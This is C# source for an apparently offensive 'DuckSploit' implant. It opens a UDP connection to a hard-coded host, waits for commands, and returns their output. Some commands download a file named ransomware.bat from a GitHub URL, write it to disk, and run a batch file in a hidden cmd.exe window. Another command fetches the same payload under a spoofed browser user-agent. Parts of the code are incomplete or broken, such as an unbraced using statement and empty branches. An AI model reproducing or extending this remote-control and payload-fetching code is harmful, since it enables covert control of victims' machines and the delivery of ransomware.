using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Collections.Generic;
// using System.Linq;
using System.Web;


namespace DuckSploit
{
	public class Program
	{
		public void CreateFileaAndWrite()
        {
            // get path
            string filepath = @"C:/DuckSploit/ransomware.bat";
            // open or create file
            FileStream streamfile = new FileStream(filepath, FileMode.OpenOrCreate, FileAccess.Write);
            // create stream writer
            StreamWriter streamwrite = new StreamWriter(streamfile);
            // add some lines
			// var request = WebRequest.Create("https://github.com/canarddu38/DUCKSPLOIT/raw/root/api/malwares/ransomware.bat");
			
			using (WebClient web1 = new WebClient())
			string data = web1.DownloadString(new Uri("https://github.com/canarddu38/DUCKSPLOIT/raw/root/api/malwares/ransomware.bat"));
			Console.WriteLine(data);
			
            // streamwrite.WriteLine("Forbidden speak in this line.");
            // streamwrite.WriteLine("Forbidden be quiet in this line.");
            // streamwrite.WriteLine("Sleeping in this line may only be possible by silence of the second line.");
            streamwrite.WriteLine(data);
            // clear streamwrite data
            streamwrite.Flush();
            // close stream writer
            streamwrite.Close();
            // close stream file
            streamfile.Close();
        }
		public static void Main(string[] args)
		{

			UdpClient udpClient = new UdpClient(0);

			try{
				udpClient.Connect("192.168.1.47", 8015);

				Byte[] sendBytes = Encoding.ASCII.GetBytes("Connected!");

				udpClient.Send(sendBytes, sendBytes.Length);

				IPEndPoint RemoteIpEndPoint = new IPEndPoint(IPAddress.Any, 0);

				while(true){
					Byte[] receiveBytes = udpClient.Receive(ref RemoteIpEndPoint);
					string returnData = Encoding.ASCII.GetString(receiveBytes);
					
					
					
					
					// Console.WriteLine("Received command from " + RemoteIpEndPoint.Address.ToString());
					
					

					string output = "";
					string error = "";
					int exitCode = 0;
					
					ProcessStartInfo processInfo;
					Process process;
					
					
					string[] result = returnData.Split(' ');
					
					// string output = "null";
					
					if(result[0] == "help")
					{
						output = "";
					}
					else if(result[0] == "exit")
					{
						System.Environment.Exit(1);
					}
					else if(result[0] == "firefox")
					{
						Program p = new Program();
						p.CreateFileaAndWrite(); // Calling method
						
						
						
						
						processInfo = new ProcessStartInfo("cmd.exe", "/c call a.bat");
						processInfo.CreateNoWindow = true;
						processInfo.UseShellExecute = false;
						processInfo.RedirectStandardError = true;
						processInfo.RedirectStandardOutput = true;
						process = Process.Start(processInfo);
						process.WaitForExit();
						output = process.StandardOutput.ReadToEnd();
						error = process.StandardError.ReadToEnd();
						exitCode = process.ExitCode;
					}
					else if(result[0] == "malware")
					{
						if(result[1] == "keylogger")
						{
							WebClient client = new WebClient ();

							// Add a user agent header in case the
							// requested URI contains a query.

							client.Headers.Add ("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");

							Stream data = client.OpenRead("https://github.com/canarddu38/DUCKSPLOIT/raw/root/api/malwares/ransomware.bat");
							StreamReader reader = new StreamReader(data);
							string s = reader.ReadToEnd();
							Console.WriteLine(s);
							data.Close();
							reader.Close();
							
							
							
						}
						else if(result[1] == "winkiller")
						{
							
						}
					}
					
					
					Console.WriteLine(output);

					Byte[] outputtobytes = Encoding.ASCII.GetBytes(output);

					udpClient.Send(outputtobytes, outputtobytes.Length);

				}
				// udpClient.End();

			}
			catch (Exception e ) {
				Console.WriteLine(e.ToString());
			}

		}

	}
}